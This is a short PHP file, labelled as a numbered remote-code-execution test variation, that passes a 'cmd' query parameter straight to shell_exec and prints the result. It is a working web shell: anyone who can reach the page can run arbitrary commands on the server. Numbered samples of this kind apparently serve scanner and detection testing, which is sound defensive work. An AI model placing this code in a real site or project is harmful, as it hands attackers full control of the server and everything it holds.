<?php
// RCE test variation #963
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>